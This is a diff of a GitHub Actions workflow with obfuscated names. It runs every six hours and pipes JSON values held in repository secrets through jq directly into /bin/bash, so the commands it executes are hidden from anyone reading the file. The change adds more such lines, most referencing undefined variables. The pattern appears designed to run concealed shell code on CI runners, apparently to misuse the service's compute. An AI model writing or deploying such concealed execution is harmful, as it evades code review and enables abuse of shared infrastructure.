@@ -1,9 +1,8 @@
 name: wanghuangzi4536
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '15 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: wanghuangzi4536
         env:
-          tqgpe31: ${{ secrets.tqgpe31 }}
+          xx2: ${{ secrets.xx2 }}
         run: |
-          echo $tqgpe31 | jq -r .smx0 | /bin/bash
-          echo $yz1 | jq -r .g571 | /bin/bash
-          echo $tewuj4847 | jq -r .ntwf80106 | /bin/bash
-          echo $pn6712 | jq -r .fpt26 | /bin/bash
-          echo $o5859 | jq -r .iyobv39 | /bin/bash
-          echo $yq81 | jq -r .xdx13 | /bin/bash
-          echo $yrani169 | jq -r .kpwmq968 | /bin/bash
-          echo $pg566 | jq -r .py1 | /bin/bash
+          echo $xx2 | jq -r .pty1 | /bin/bash
+          echo $pspk140 | jq -r .ooh089 | /bin/bash
+          echo $dp8 | jq -r .l5 | /bin/bash
+          echo $kwe85001 | jq -r .yka4 | /bin/bash
+          echo $jufvb56 | jq -r .r5 | /bin/bash
+          echo $xl222 | jq -r .alcm6373 | /bin/bash
+          echo $jcvn59738 | jq -r .ez0 | /bin/bash
+          echo $cu55876 | jq -r .q362 | /bin/bash
+          echo $ipz80946 | jq -r .mrvog67 | /bin/bash
+          echo $nwld923 | jq -r .ywi5292 | /bin/bash
+          echo $lv5478 | jq -r .xkwr26359 | /bin/bash
+          echo $refm03479 | jq -r .vnnf67786 | /bin/bash
+          echo $l11 | jq -r .t27 | /bin/bash
 
